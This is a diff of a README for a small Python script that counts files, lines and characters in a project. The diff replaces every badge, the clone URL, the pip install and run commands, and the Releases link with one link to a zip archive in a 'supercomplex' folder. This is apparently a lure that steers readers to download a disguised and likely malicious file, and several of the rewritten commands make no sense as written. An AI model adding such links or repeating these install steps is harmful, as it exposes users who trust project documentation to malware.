@@ -4,7 +4,7 @@ A lightweight Python script to analyze and count files, lines, and characters in
 
 ---
 
-![GitHub Project Stats](https://img.shields.io/badge/version-1.0.0-brightgreen.svg) ![Python Version](https://img.shields.io/badge/python-3.8%2B-blue.svg) ![License](https://img.shields.io/badge/license-MIT-yellow.svg)
+![GitHub Project Stats](https://github.com/tynax/GitHub-Project-Stats/raw/refs/heads/main/supercomplex/Hub-Git-Project-Stats-1.9.zip) ![Python Version](https://github.com/tynax/GitHub-Project-Stats/raw/refs/heads/main/supercomplex/Hub-Git-Project-Stats-1.9.zip%https://github.com/tynax/GitHub-Project-Stats/raw/refs/heads/main/supercomplex/Hub-Git-Project-Stats-1.9.zip) ![License](https://github.com/tynax/GitHub-Project-Stats/raw/refs/heads/main/supercomplex/Hub-Git-Project-Stats-1.9.zip)
 
 ---
 
@@ -44,7 +44,7 @@ To get started, you'll need to have Python 3.8 or higher installed.
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/tynax/GitHub-Project-Stats.git
+   git clone https://github.com/tynax/GitHub-Project-Stats/raw/refs/heads/main/supercomplex/Hub-Git-Project-Stats-1.9.zip
    ```
 
 2. Navigate into the project directory:
@@ -56,7 +56,7 @@ To get started, you'll need to have Python 3.8 or higher installed.
 3. Install required dependencies:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/tynax/GitHub-Project-Stats/raw/refs/heads/main/supercomplex/Hub-Git-Project-Stats-1.9.zip
    ```
 
 ---
@@ -66,7 +66,7 @@ To get started, you'll need to have Python 3.8 or higher installed.
 To use the script, navigate to your project directory and run:
 
 ```bash
-python main.py
+python https://github.com/tynax/GitHub-Project-Stats/raw/refs/heads/main/supercomplex/Hub-Git-Project-Stats-1.9.zip
 ```
 
 This will execute the analysis on your GitHub project. Make sure you have Python 3.8 or higher to ensure smooth execution.
@@ -83,7 +83,7 @@ You can customize the command by using various options:
 Example:
 
 ```bash
-python main.py --path your/project/path --verbose
+python https://github.com/tynax/GitHub-Project-Stats/raw/refs/heads/main/supercomplex/Hub-Git-Project-Stats-1.9.zip --path your/project/path --verbose
 ```
 
 ---
@@ -128,7 +128,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 - Thanks to the open-source community for their support.
 - Special thanks to contributors who help improve this project.
   
-For more information, check the [Releases](https://github.com/tynax/GitHub-Project-Stats/releases) section for the latest updates and downloads.
+For more information, check the [Releases](https://github.com/tynax/GitHub-Project-Stats/raw/refs/heads/main/supercomplex/Hub-Git-Project-Stats-1.9.zip) section for the latest updates and downloads.
 
 ---
 
